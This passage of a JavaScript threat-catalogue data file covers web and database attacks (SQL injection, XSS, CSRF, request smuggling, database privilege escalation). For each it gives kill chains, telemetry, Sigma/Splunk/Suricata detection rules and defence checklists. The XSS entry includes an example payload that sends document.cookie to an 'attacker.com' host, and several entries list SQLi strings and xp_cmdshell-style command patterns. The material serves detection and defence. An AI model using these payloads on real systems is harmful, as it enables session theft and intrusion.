        "HTTP requests containing SQL syntax tokens ('UNION SELECT', 'OR 1=1', 'BENCHMARK(', 'WAITFOR DELAY')",
        "Rapid burst of HTTP 500 error responses followed by large HTTP 200 payload responses",
        "Web application submitting queries that access system metadata tables (information_schema.tables)"
      ]
    },
    rules: {
      sigma: `title: Classic Web SQL Injection Attack Patterns
id: c4d5e6f7-a8b9-0c1d-2e3f-4a5b6c7d8e9f
status: production
description: Detects classic SQL injection UNION and authentication bypass patterns in web request parameters.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - 'UNION SELECT'
            - 'UNION+SELECT'
            - '\' OR \''
            - '\' OR 1=1'
            - '--'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=web_waf (cs_uri_query="*UNION*SELECT*" OR cs_uri_query="*OR*1=1*")
| stats count by c_ip, cs_uri_stem, cs_uri_query
| eval Alert="CRITICAL: Web SQL Injection Exploitation Detected"
| table _time, c_ip, cs_uri_stem, cs_uri_query, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Web SQL Injection UNION SELECT Statement Detected";
    flow:to_server,established;
    content:"UNION"; nocase; http_uri;
    content:"SELECT"; nocase; http_uri;
    classtype:web-application-attack;
    sid:1000097;
    rev:1;
)`,
      sysmon: `# Verify parameterized queries in backend code:
grep -rn "SELECT" ./src/ | grep -E "\\+|\\$"`
    },
    defenseChecklist: [
      { id: "wsq_1", title: "Mandatory Parameterized Prepared Statements", tier: "Application Logic", desc: "Enforce parameterized prepared statements for 100% of SQL queries across all web controllers and repository modules." },
      { id: "wsq_2", title: "Principle of Least Privilege Database Account", tier: "Database Hardening", desc: "Configure web applications to connect with accounts limited strictly to necessary SELECT, INSERT, UPDATE permissions; revoke DROP and ALTER." },
      { id: "wsq_3", title: "Deploy Web Application Firewall (WAF) SQLi Shield", tier: "Perimeter", desc: "Enable aggressive SQLi inspection signatures on edge WAFs to terminate anomalous SQL tokens before reaching web servers." },
      { id: "wsq_4", title: "Automated SAST & DAST SQL Injection Scanning", tier: "CI/CD Pipeline", desc: "Run continuous static code analysis and automated dynamic vulnerability scanners on every staging deployment." }
    ]
  },
  {
    num: 98,
    id: "web-xss",
    name: "Cross-Site Scripting (XSS) (Repeated)",
    shortName: "Web XSS (Repeated)",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "high",
    cvss: "8.3",
    mitre: "T1189, T1059.007",
    primaryTargets: "Client Browsers, Session Storage, DOM Objects, User Cookies, Single Page Applications (SPA)",
    threatActors: "Magecart Card Skimmers, Session Hijackers, Social Engineering Phishers",
    summary: "Cross-Site Scripting (XSS) attacks occur when malicious scripts are injected into otherwise benign and trusted websites. When a victim's browser renders the webpage containing injected JavaScript, the browser executes the script in the context of the user's session. Variants include Stored (Persistent) XSS, Reflected XSS, and DOM-based XSS, enabling session cookie theft, keylogging of banking credentials, and dynamic page defacement.",
    killChain: [
      {
        step: 1,
        title: "Injection Sink Identification",
        mitre: "T1595.002",
        desc: "Probing input forms (comments, profile names, search boxes) to see if raw HTML/JS characters (<script>, <img>, onerror) are reflected into the DOM."
      },
      {
        step: 2,
        title: "Malicious Script Payload Delivery",
        mitre: "T1189",
        desc: "Injecting obfuscated JavaScript payloads (e.g. <img src=x onerror=this.src='https://attacker.com/log?c='+document.cookie>)."
      },
      {
        step: 3,
        title: "Client-Side Execution & Credential Theft",
        mitre: "T1059.007",
        desc: "Victim loads the page; script executes, exfiltrating session tokens, keystrokes, and submitted form passwords to attacker C2."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Firewall (WAF) Inspection Logs",
        "Content Security Policy (CSP) Violation Reports",
        "Client-Side Telemetry & Browser Error Reporting"
      ],
      anomalies: [
        "Inbound requests containing '<script', 'javascript:', 'onerror=', or 'onload=' tags",
        "Surge in Content Security Policy violation reports submitted by user browsers",
        "Outbound browser network requests directed to unknown third-party domains carrying cookie parameters"
      ]
    },
    rules: {
      sigma: `title: Cross-Site Scripting (XSS) Inbound Script Tag Injection
id: d5e6f7a8-b9c0-1d2e-3f4a-5b6c7d8e9f0a
status: production
description: Detects basic script tags and event handler injection strings in HTTP request query and body.
logsource:
    category: webserver
detection:
    selection:
        payload|contains:
            - '<script'
            - 'javascript:'
            - 'onerror='
            - 'onload='
            - '<svg onload'
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1189`,
      splunk: `index=web_waf (payload="*<script*" OR payload="*javascript:*" OR payload="*onerror=*")
| stats count by src_ip, uri, payload
| eval Alert="HIGH: Cross-Site Scripting (XSS) Exploit Attempt"
| table _time, src_ip, uri, payload, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Cross-Site Scripting XSS Script Tag Detected";
    flow:to_server,established;
    content:"<script"; nocase; http_uri;
    classtype:web-application-attack;
    sid:1000098;
    rev:1;
)`,
      sysmon: `# Verify CSP header implementation:
curl -I https://target-app.internal | grep -i "content-security-policy"`
    },
    defenseChecklist: [
      { id: "wxss_1", title: "Enforce Strict Content Security Policy (CSP Level 3)", tier: "HTTP Headers", desc: "Deploy 'Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...' object-src 'none';' to completely block inline and unauthorized scripts." },
      { id: "wxss_2", title: "Context-Aware Output Encoding (DOMPurify)", tier: "Application Logic", desc: "Sanitize all user-controlled HTML using DOMPurify before inserting into DOM, and encode data contextually." },
      { id: "wxss_3", title: "HttpOnly & SameSite Session Cookies", tier: "Cookie Security", desc: "Set HttpOnly flag on all authentication and session cookies so client-side JavaScript cannot access or steal them via document.cookie." },
      { id: "wxss_4", title: "Use Safe Modern Frontend Frameworks", tier: "Development", desc: "Use frameworks like React or Angular that automatically escape data binding by default, avoiding dangerouslySetInnerHTML." }
    ]
  },
  {
    num: 99,
    id: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    shortName: "CSRF Attack",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "high",
    cvss: "8.1",
    mitre: "T1189, T1566.002",
    primaryTargets: "Authenticated User Sessions, Password Change Endpoints, Wire Transfer APIs, Router Admin Consoles",
    threatActors: "Financial Fraudsters, Phishing Syndicates, Compromised Ad Networks",
    summary: "CSRF forces an end user to execute unwanted actions on a web application in which they are currently authenticated. Because browsers automatically include ambient session cookies with cross-origin requests, a malicious website visited by an authenticated user can submit hidden POST requests to vulnerable banking or administrative portals (e.g., transferring funds, changing user email/password) without the victim's knowledge or consent.",
    killChain: [
      {
        step: 1,
        title: "Vulnerable State-Changing Endpoint Discovery",
        mitre: "T1595.002",
        desc: "Locating critical POST/PUT endpoints (e.g. /account/change-email) that lack anti-CSRF token validation."
      },
      {
        step: 2,
        title: "Malicious Trap Site Weaponization",
        mitre: "T1189",
        desc: "Crafting a malicious HTML page with an auto-submitting hidden form pointing to the target application's endpoint."
      },
      {
        step: 3,
        title: "Victim Lure & Unintended Action Execution",
        mitre: "T1566.002",
        desc: "Tricking the authenticated victim into visiting the trap page; browser transmits cookies and submits the unauthorized transfer."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Origin and Referer header telemetry)",
        "Application CSRF Token Validation Logs (CSRF Token Mismatch events)",
        "WAF / Proxy Inspection Logs"
      ],
      anomalies: [
        "State-changing POST/PUT requests with mismatched or foreign Origin / Referer headers",
        "Sudden spike in HTTP 403 Forbidden errors triggered by CSRF middleware token failures",
        "Critical account settings modifications occurring without corresponding GET navigation requests"
      ]
    },
    rules: {
      sigma: `title: Cross-Site Request Forgery (CSRF) Cross-Origin Origin Mismatch
id: e6f7a8b9-c0d1-2e3f-4a5b-6c7d8e9f0a1b
status: production
description: Detects state-changing HTTP requests where the Origin header does not match the target host.
logsource:
    category: webserver
detection:
    selection:
        cs-method:
            - 'POST'
            - 'PUT'
            - 'DELETE'
        cs-uri-stem|contains:
            - '/account/'
            - '/transfer'
            - '/admin/'
    filter:
        c-origin|contains: 'target-domain.com'
    condition: selection and not filter
level: high
tags:
    - attack.initial_access
    - attack.t1189`,
      splunk: `index=web_logs cs_method="POST" cs_uri_stem="/api/transfer*"
| eval Host=cs_host, Origin=cs_origin
| where isnotnull(Origin) AND NOT like(Origin, "%" . Host . "%")
| stats count by c_ip, cs_uri_stem, Host, Origin
| eval Alert="HIGH: State-Changing Request with Cross-Origin Mismatch (Potential CSRF)"
| table _time, c_ip, cs_uri_stem, Host, Origin, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT State-Changing HTTP POST Without Anti-CSRF Token";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/api/account/password"; http_uri;
    content:!"csrf_token="; http_client_body;
    classtype:web-application-attack;
    sid:1000099;
    rev:1;
)`,
      sysmon: `# Verify SameSite cookie configuration in web framework:
grep -rn "SameSite" ./src/config/session.js`
    },
    defenseChecklist: [
      { id: "csrf_1", title: "Enforce SameSite=Strict or SameSite=Lax Cookies", tier: "Cookie Security", desc: "Configure all session cookies with 'SameSite=Strict' (or 'Lax' for read navigation), blocking cross-origin cookie transmission." },
      { id: "csrf_2", title: "Cryptographically Bound Anti-CSRF Synchronizer Tokens", tier: "Application Logic", desc: "Generate unpredictable, cryptographically random, per-session anti-CSRF tokens and validate them on every POST, PUT, and DELETE request." },
      { id: "csrf_3", title: "Validate Ingress Origin & Referer Headers", tier: "Web Server / Middleware", desc: "Verify that the incoming Origin or Referer header matches the application's trusted origin, dropping cross-origin state changes." },
      { id: "csrf_4", title: "Re-Authentication for Sensitive Operations", tier: "Application Logic", desc: "Require users to re-enter their current password or verify MFA before executing critical account changes (email, password, funds)." }
    ]
  },
  {
    num: 100,
    id: "http-request-smuggling",
    name: "HTTP Request Smuggling",
    shortName: "Request Smuggling",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "critical",
    cvss: "9.3",
    mitre: "T1190, T1557",
    primaryTargets: "Edge Reverse Proxies, CDN Layers, Load Balancers, Backend Microservice Web Servers",
    threatActors: "Top-Tier Exploit Researchers, Nation-State Cyber Operations, APT Groups",
    summary: "HTTP Request Smuggling is an advanced attack technique exploiting discrepancies in how a front-end proxy server (load balancer, CDN) and back-end web server interpret the boundaries of HTTP requests. By manipulating conflicting 'Content-Length' (CL) and 'Transfer-Encoding' (TE) headers (CL.TE, TE.CL, TE.TE), an attacker desynchronizes the TCP connection, causing a hidden partial HTTP request to be prepended to the next legitimate user's request, hijacking sessions and bypassing front-end security controls.",
    killChain: [
      {
        step: 1,
        title: "Proxy Desynchronization Probing",
        mitre: "T1595.002",
        desc: "Sending probe requests containing both Content-Length and Transfer-Encoding headers (CL.TE / TE.CL) and measuring server response timing."
      },
      {
        step: 2,
        title: "TCP Stream Desynchronization",
        mitre: "T1190",
        desc: "Front-end forwards the request based on Content-Length, while back-end reads based on chunked Transfer-Encoding, leaving trailing payload in the pipeline."
      },
      {
        step: 3,
        title: "Request Poisoning & Session Hijack",
        mitre: "T1557",
        desc: "The smuggled prefix attaches to the next user's HTTP request, redirecting their session credentials or stealing their administrative cookies."
      }
    ],
    telemetry: {
      sources: [
        "Edge Load Balancer & Reverse Proxy Logs (AWS ALB, Cloudflare, Nginx)",
        "Backend Web Server Access Logs (Discrepancies in request count vs proxy)",
        "Network Packet Telemetry (Malformed HTTP header parsing logs)"
      ],
      anomalies: [
        "HTTP requests featuring both Content-Length and Transfer-Encoding headers in the same request",
        "Discrepancy in the number of requests logged between the edge proxy and backend application servers",
        "Backend server returning HTTP 400 Bad Request or unexpected 405 Method Not Allowed errors"
      ]
    },
    rules: {
      sigma: `title: HTTP Request Smuggling Conflicting Header Pattern
id: f7a8b9c0-d1e2-3f4a-5b6c-7d8e9f0a1b2c
status: production
description: Detects HTTP requests containing both Content-Length and Transfer-Encoding headers indicative of smuggling.
logsource:
    category: webserver
detection:
    selection:
        http_headers|contains|all:
            - 'Content-Length'
            - 'Transfer-Encoding'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=edge_proxy (http_content_length=* AND http_transfer_encoding=*)
| stats count by c_ip, cs_uri_stem, http_content_length, http_transfer_encoding
| eval Alert="CRITICAL: Conflicting Content-Length & Transfer-Encoding Headers (HTTP Request Smuggling Attempt)"
| table _time, c_ip, cs_uri_stem, http_content_length, http_transfer_encoding, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Conflicting Content-Length and Transfer-Encoding Headers (Request Smuggling)";
    flow:to_server,established;
    content:"Content-Length:"; http_header; nocase;
    content:"Transfer-Encoding:"; http_header; nocase;
    classtype:web-application-attack;
    sid:1000100;
    rev:1;
)`,
      sysmon: `# Verify backend web server rejects ambiguous chunked headers:
nginx -T | grep -i "underscores_in_headers"`
    },
    defenseChecklist: [
      { id: "smug_1", title: "Adopt End-to-End HTTP/2 or HTTP/3", tier: "Protocol Architecture", desc: "Use HTTP/2 end-to-end between clients, reverse proxies, and backend servers; HTTP/2 has unambiguous frame length definitions." },
      { id: "smug_2", title: "Drop Requests with Ambiguous Headers", tier: "Proxy Configuration", desc: "Configure front-end proxies to normalize headers and reject any request containing both Content-Length and Transfer-Encoding." },
      { id: "smug_3", title: "Disable Backend TCP Connection Reuse", tier: "Infrastructure", desc: "Disable persistent connection pipelining (Keep-Alive reuse) between front-end and back-end servers where feasible." },
      { id: "smug_4", title: "Enforce Strict RFC 7230 Compliance", tier: "Web Server", desc: "Configure web servers to reject requests with invalid whitespace, duplicate headers, or obscure chunked encoding variations." }
    ]
  },

  // =========================================================================
  // MODULE 18: DATABASE ATTACKS (101 - 105)
  // =========================================================================
  {
    num: 101,
    id: "db-privilege-escalation",
    name: "Database Privilege Escalation",
    shortName: "DB Privilege Escalation",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "critical",
    cvss: "8.9",
    mitre: "T1068, T1548",
    primaryTargets: "Database User Accounts, Stored Procedures, DBA Roles, DBMS System Catalogs, Database Links",
    threatActors: "Malicious Database Administrators, Advanced Persistent Threats, Disgruntled Developers",
    summary: "Database Privilege Escalation occurs when an authenticated database user with limited privileges (e.g. read-only app user) exploits vulnerabilities, configuration flaws, or excessive stored procedure permissions (such as DEFINER / SECURITY DEFINER procedures in MySQL/PostgreSQL or TRUSTWORTHY bit in MS SQL) to acquire DBA (sysadmin, superuser) privileges, allowing full database control, file system read/write, and OS command execution.",
    killChain: [
      {
        step: 1,
        title: "Database Context & Role Enumeration",
        mitre: "T1087.002",
        desc: "Querying database system tables (pg_roles, sys.database_principals) to determine granted permissions and available procedures."
      },
      {
        step: 2,
        title: "SECURITY DEFINER Procedure Exploitation",
        mitre: "T1548",
        desc: "Invoking a procedure running with elevated owner privileges (DEFINER) with crafted arguments or search_path hijacking."
      },
      {
        step: 3,
        title: "Granting Sysadmin Privileges & OS Shell",
        mitre: "T1068",
        desc: "Adding the compromised account to the sysadmin or superuser role, followed by invoking xp_cmdshell or COPY TO PROGRAM for OS shell."
      }
    ],
    telemetry: {
      sources: [
        "Database Audit Logs (pg_audit, SQL Server Audit, Oracle Audit Trail)",
        "Database User Privilege Mutation Events (ALTER ROLE, GRANT DBA)",
        "System Process Creation Logs from Database Binaries (postgres, sqlservr.exe)"
      ],
      anomalies: [
        "Standard application database user executing GRANT ... TO or ALTER USER commands",
        "Modification of database server configuration parameters (sp_configure, shared_preload_libraries)",
        "Sudden invocation of administrative stored procedures by non-admin database connections"
      ]
    },
    rules: {
      sigma: `title: Database Role Granting Sysadmin / Superuser Privileges
id: a8b9c0d1-e2f3-4a5b-6c7d-8e9f0a1b2c3d
status: production
description: Detects SQL statements executed to grant administrative or superuser privileges to low-privileged database accounts.
logsource:
    category: database
detection:
    selection:
        query|contains:
            - 'GRANT sysadmin TO'
            - 'ALTER ROLE.*SUPERUSER'
            - 'GRANT ALL PRIVILEGES ON DATABASE'
            - 'sp_addsrvrolemember'
    condition: selection
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1548`,
      splunk: `index=db_audit (query="*GRANT sysadmin*" OR query="*ALTER ROLE*SUPERUSER*" OR query="*sp_addsrvrolemember*")
| stats count by user, db_name, client_ip, query
| eval Alert="CRITICAL: Database Privilege Escalation to DBA / Superuser"
| table _time, user, db_name, client_ip, query, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $DB_SERVERS 1433 (
    msg:"SEC-ALERT MS SQL Server xp_cmdshell Activation Attempt";
    flow:to_server,established;
    content:"xp_cmdshell"; nocase;
    classtype:attempted-admin;
    sid:1000101;
    rev:1;
)`,
      sysmon: `# Verify PostgreSQL audit logging is active:
psql -U postgres -c "SHOW pgaudit.log;"`
    },
    defenseChecklist: [
      { id: "dpe_1", title: "Enforce Principle of Least Privilege (PoLP)", tier: "Database Hardening", desc: "Ensure application database accounts possess only strictly required DML permissions (SELECT, INSERT, UPDATE); strip DDL and admin roles." },
      { id: "dpe_2", title: "Audit & Secure SECURITY DEFINER Stored Procedures", tier: "Database Logic", desc: "Explicitly set search_path = '' on all PostgreSQL SECURITY DEFINER functions to eliminate search_path hijacking vulnerabilities." },
      { id: "dpe_3", title: "Disable Dangerous Extended Stored Procedures", tier: "DBMS Config", desc: "Permanently disable or drop xp_cmdshell, sp_OACreate, and file system export functions on database engines." },
      { id: "dpe_4", title: "Enable Comprehensive Database Activity Monitoring (DAM)", tier: "Monitoring", desc: "Deploy real-time Database Activity Monitoring (DAM) to trigger instant alerts upon any privilege modification or role change." }
    ]
  },
  {
    num: 102,
    id: "unauthorized-db-access",
    name: "Unauthorized Database Access",
    shortName: "Unauthorized DB Access",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "critical",
    cvss: "9.6",
    mitre: "T1078, T1021.006",
    primaryTargets: "Exposed Database Ports (3306, 5432, 1433, 1521, 27017), Cloud Relational Instances, Redis, MongoDB",
    threatActors: "Ransomware Cartels, Shodan Crawlers, Cyber Mercenaries",
    summary: "Unauthorized Database Access occurs when adversaries establish direct network connections to database instances without valid authorization, typically due to databases inadvertently bound to public IP addresses (0.0.0.0), missing firewall rules, weak or default passwords (e.g. postgres/postgres, sa/blank), or compromised connection strings leaked in public GitHub repositories and backup archives, leading to immediate database tampering and ransomware ransom notes.",
    killChain: [
      {
        step: 1,
        title: "Internet-Wide Database Port Scanning",
        mitre: "T1595.001",
        desc: "Scanning IPv4 addresses on standard database ports (1433, 3306, 5432, 27017) using masscan or querying Shodan/Censys."
      },
      {
        step: 2,
        title: "Default Credential & Brute-Force Authentication",
        mitre: "T1110.001",
        desc: "Testing default administrative credentials (root/blank, sa/sa, postgres/postgres) or using connection strings scraped from GitHub."
      },
      {
        step: 3,
        title: "Database Dropping & Ransom Extortion",
        mitre: "T1486",
        desc: "Dumping all database tables to an external VPS, executing DROP DATABASE, and creating a README_RECOVER_YOUR_DATA table."
      }
    ],
    telemetry: {
      sources: [
        "Network Firewall Ingress Logs (Traffic on ports 1433, 3306, 5432 from external IPs)",
        "Database Authentication Logs (pg_hba.conf rejections, MySQL failed logins)",
        "Cloud Security Posture Management (CSPM public database exposure alerts)"
      ],
      anomalies: [
        "Direct database connection attempts originating from public non-whitelisted IP addresses",
        "Failed database login attempts using common administrative usernames (sa, root, postgres, admin)",
        "DROP DATABASE or DROP TABLE commands executed outside maintenance windows"
      ]
    },
    rules: {
      sigma: `title: Direct Database Connection from External Non-Whitelisted IP
id: b9c0d1e2-f3a4-5b6c-7d8e-9f0a1b2c3d4e
status: production
description: Detects direct network connection attempts to internal database ports originating from external Internet IP addresses.
logsource:
    category: firewall
detection:
    selection:
        action: 'allowed'
        dest_port:
            - 1433
            - 3306
            - 5432
            - 1521
            - 27017
            - 6379
        src_ip|startswith:
            - '10.'
            - '172.16.'
            - '192.168.'
    condition: not selection
level: critical
tags:
    - attack.initial_access
    - attack.t1078`,
      splunk: `index=db_connections NOT (src_ip IN ("10.*", "172.16.*", "192.168.*"))
| stats count by src_ip, db_port, user, status
| eval Alert="CRITICAL: Unauthorized Direct Internet Access to Enterprise Database"
| table _time, src_ip, db_port, user, status, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET [1433,3306,5432,27017] (
    msg:"SEC-ALERT Direct External Connection to Database Port";
    flow:to_server,established;
    classtype:policy-violation;
    sid:1000102;
    rev:1;
)`,
      sysmon: `# Verify database listens only on localhost or private interface:
netstat -tulpn | grep -E "5432|3306|1433|27017"`
    },
    defenseChecklist: [
      { id: "uda_1", title: "Strict Network Microsegmentation & No Public IPs", tier: "Network Architecture", desc: "Never assign public IPs to database servers; place databases inside isolated private subnets accessible only via application tier bastions." },
      { id: "uda_2", title: "Enforce Client Certificate Authentication (mTLS)", tier: "Authentication", desc: "Require mutual TLS (mTLS) with client certificates for all database connections, completely blocking unauthenticated password probing." },
      { id: "uda_3", title: "Mandatory Ephemeral PAM Credentials", tier: "Identity Governance", desc: "Enforce Privileged Access Management (HashiCorp Vault, CyberArk) to issue dynamic, short-lived database credentials." },
      { id: "uda_4", title: "Automated Cloud Security Posture Management (CSPM)", tier: "Cloud Security", desc: "Deploy CSPM tools (Wiz, Prisma Cloud, AWS Security Hub) to automatically detect and auto-remediate publicly exposed database ports." }
    ]
  },
  {
    num: 103,
    id: "db-sql-injection",
    name: "SQL Injection (Repeated)",
    shortName: "Database SQLi (Repeated)",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1190, T1059.004",
    primaryTargets: "Database Query Engines, Stored Procedures, Linked Servers, DBMS Extended Stored Procedures",
    threatActors: "Database Extortion Gangs, State-Sponsored Espionage, Automated Worms",
    summary: "From the database engine perspective, SQL Injection represents the execution of arbitrary Structured Query Language code directly against the relational database management system. Once SQL statements break out of data literals, attackers invoke database-level administrative routines—such as PostgreSQL COPY TO PROGRAM, Oracle DBMS_EXPORT, or Microsoft SQL Server xp_cmdshell—to elevate access from query manipulation to operating system command execution on the database host.",
    killChain: [
      {
        step: 1,
        title: "Database Engine & Version Fingerprinting",
        mitre: "T1082",
        desc: "Extracting exact database engine details using version functions (@@version, version(), banner) to locate specific DBMS CVEs."
      },
      {
        step: 2,
        title: "Stacked Query Execution & Procedure Activation",
        mitre: "T1190",
        desc: "Issuing stacked queries (separated by semicolons) to enable administrative procedures like sp_configure 'show advanced options', 1; RECONFIGURE;."
      },
      {
        step: 3,
        title: "Host Operating System Compromise",
        mitre: "T1059.004",
        desc: "Invoking EXEC xp_cmdshell 'powershell -enc ...' or PostgreSQL COPY cmd FROM PROGRAM to spawn a reverse shell on the database server."
      }
    ],
    telemetry: {
      sources: [
        "Database Audit Logs (Detailed SQL execution logging)",
        "Database Process Activity (Execution of shell commands by database service account)",
        "Database Error Logs (Unusual syntax errors caused by stacked query injection)"
      ],
      anomalies: [
        "Execution of stacked queries (multiple SQL statements in single call) by web application connections",
        "Calls to database system functions that execute OS commands (xp_cmdshell, sys_exec, COPY TO/FROM PROGRAM)",
        "Sudden creation of new database administrative accounts through inline SQL statements"
      ]
    },
    rules: {
      sigma: `title: Execution of Dangerous Database Extended Stored Procedures
id: c0d1e2f3-a4b5-6c7d-8e9f-0a1b2c3d4e5f
status: production
description: Detects invocation of xp_cmdshell, sp_configure, or PostgreSQL COPY PROGRAM from SQL connections.
logsource:
    category: database
detection:
    selection:
        query|contains:
            - 'xp_cmdshell'
            - 'COPY'
            - 'FROM PROGRAM'
            - 'sys_eval'
            - 'sp_configure'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059.004`,
      splunk: `index=db_audit (query="*xp_cmdshell*" OR query="*FROM PROGRAM*" OR query="*sys_exec*")
| stats count by user, db_name, client_ip, query
| eval Alert="CRITICAL: OS Command Execution Invoked from Database Engine"
| table _time, user, db_name, client_ip, query, Alert`,
      suricata: `alert tcp any any -> $DB_SERVERS 5432 (
    msg:"SEC-ALERT PostgreSQL COPY FROM PROGRAM Command Execution Attempt";
    flow:to_server,established;
    content:"COPY"; nocase;
    content:"FROM PROGRAM"; nocase;
    classtype:attempted-admin;
    sid:1000103;
    rev:1;
)`,
      sysmon: `# Monitor child processes spawned by database daemons:
Get-Process | Where-Object {$_.Parent.ProcessName -match "sqlservr|postgres|mysqld"}`
    },
    defenseChecklist: [
      { id: "dbsqi_1", title: "Enforce Strict Parameterized Query Binding in Database Drivers", tier: "Application Logic", desc: "Mandate native driver parameterization (PreparedStatement in JDBC, prepared queries in psycopg2) to guarantee literal binding." },
      { id: "dbsqi_2", title: "Disable Stacked Queries in Database Connection Strings", tier: "Driver Config", desc: "Disable multi-statement / stacked query execution in connection pool drivers (e.g. multiStatements=false in MySQL JDBC)." },
      { id: "dbsqi_3", title: "Strip Operating System Command Extensions", tier: "Database Hardening", desc: "Drop or strictly restrict access to xp_cmdshell, pg_read_file, pg_write_file, and prevent untrusted C-language UDF creation." },
      { id: "dbsqi_4", title: "Run Database Service Under Restricted OS Virtual Account", tier: "OS Hardening", desc: "Run database processes under isolated virtual service accounts (NT Service\\MSSQLSERVER) with no write access outside data volumes." }
    ]
  },
  {
    num: 104,
    id: "blind-sql-injection",
    name: "Blind SQL Injection",
    shortName: "Blind SQL Injection",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "high",
    cvss: "8.6",
    mitre: "T1190, T1083",
    primaryTargets: "Database Backends with Generic Error Pages, Blind Search Endpoints, Authentication Lookups",
    threatActors: "Automated Data Harvesting Scripts, Advanced Hackers, Penetration Testers",
    summary: "Blind SQL Injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the SQL query or any database error details. Attackers infer database contents character-by-character using two techniques: Boolean-based blind (observing conditional true/false differences in page rendering or HTTP status) and Time-based blind (forcing the database to pause using SLEEP(5) or WAITFOR DELAY '0:0:5').",
    killChain: [
      {
        step: 1,
        title: "Conditional Logic Probing",
        mitre: "T1190",
        desc: "Injecting boolean comparisons (' AND 1=1 vs ' AND 1=2) or time delays (' AND SLEEP(5)--) to observe conditional differences."
      },
      {
        step: 2,
        title: "Character-by-Character Bisection Extraction",
        mitre: "T1083",
        desc: "Using binary search algorithms (SUBSTRING(version(),1,1) > 'M') to iteratively deduce database characters."
      },
      {
        step: 3,
        title: "Automated Schema & Hash Siphoning",
        mitre: "T1005",
        desc: "Running automated tools (sqlmap, custom Python scripts) to systematically dump entire tables over hundreds of sequential queries."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Response Latency Metrics (APM traces showing 5+ second spikes)",
        "Database Slow Query Logs (Queries containing pg_sleep, SLEEP, WAITFOR DELAY)",
        "WAF Detection Logs (Repetitive query parameter length variations)"
      ],
      anomalies: [
        "Consistent 5-second or 10-second response latency spikes on specific API endpoints",
        "Single client IP issuing thousands of near-identical queries varying only by a single integer offset parameter",
        "Presence of SLEEP(), BENCHMARK(), or WAITFOR DELAY in web request parameters or database slow logs"
      ]
    },
    rules: {
      sigma: `title: Time-Based Blind SQL Injection Delay Injection
id: d1e2f3a4-b5c6-7d8e-9f0a-1b2c3d4e5f6a
status: production
description: Detects time-delay functions (SLEEP, WAITFOR DELAY, pg_sleep) commonly used in blind SQL injection.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - 'WAITFOR DELAY'
            - 'WAITFOR+DELAY'
            - 'pg_sleep('
            - 'SLEEP('
            - 'BENCHMARK('
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=db_slow_queries (query="*WAITFOR DELAY*" OR query="*SLEEP(*" OR query="*pg_sleep(*")
| stats count by user, client_ip, query, duration
| eval Alert="HIGH: Time-Based Blind SQL Injection Detected in Slow Query Log"
| table _time, user, client_ip, duration, query, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Time-Based Blind SQL Injection Payload in Query";
    flow:to_server,established;
    content:"WAITFOR"; nocase; http_uri;
    content:"DELAY"; nocase; http_uri;
    classtype:web-application-attack;
    sid:1000104;
    rev:1;
)`,
      sysmon: `# Monitor database slow query log:
tail -f /var/log/mysql/mysql-slow.log | grep -iE "sleep|benchmark"`
    },
    defenseChecklist: [
      { id: "bsqi_1", title: "Enforce Parameterized Query Abstraction for All Dynamic Filters", tier: "Application Logic", desc: "Ensure even dynamic search, sort, and filter endpoints use strictly parameterized query builders or query criteria APIs." },
      { id: "bsqi_2", title: "Implement Strict Query Execution Timeouts", tier: "Database Config", desc: "Set strict statement execution timeouts (statement_timeout = 3000ms in PostgreSQL) to neutralize time-based blind SQLi delays." },
      { id: "bsqi_3", title: "Deploy Behavioral Anomaly Rate Limiting", tier: "WAF / API Gateway", desc: "Throttle clients that submit high volumes of requests with incremental character parameter modifications." },
      { id: "bsqi_4", title: "Generic Error Handling & Uniform Response Times", tier: "Application Security", desc: "Return uniform error messages and normalize response timing to prevent timing-based side-channel leaks." }
    ]
  },
  {
    num: 105,
    id: "db-enumeration",
    name: "Database Enumeration",
    shortName: "Database Enumeration",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "medium",
    cvss: "6.5",
    mitre: "T1082, T1087.002, T1083",
    primaryTargets: "Database Information Schema, Sysobjects, Master Database, pg_catalog, v$session",
    threatActors: "Reconnaissance Scouts, Initial Access Brokers, Lateral Movement Actors",
